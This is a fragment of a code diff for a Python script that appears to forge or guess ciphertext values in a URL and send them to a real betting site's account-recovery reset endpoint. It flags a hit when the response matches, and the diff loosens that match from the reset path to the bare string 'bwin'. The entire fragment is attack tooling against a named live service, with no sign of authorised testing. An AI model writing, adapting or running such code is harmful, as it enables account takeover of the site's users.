@@ -14,7 +14,7 @@ def worker(job_number, from_thread=True, iv="0000000000000000"):
     ciphertext = ciphertext_base + new_ciphertext
     test_url = re.sub(r"CTEXT", ciphertext, url)
     response = requests.get(test_url, allow_redirects=False)
-    if re.search("www.bwin.com/en/account/recovery/reset", response.text, re.MULTILINE) is not None:
+    if re.search("bwin", response.text, re.MULTILINE) is not None:
         print(f"Found: {new_plaintext_append_number}")
         if from_thread:
             os._exit(0)
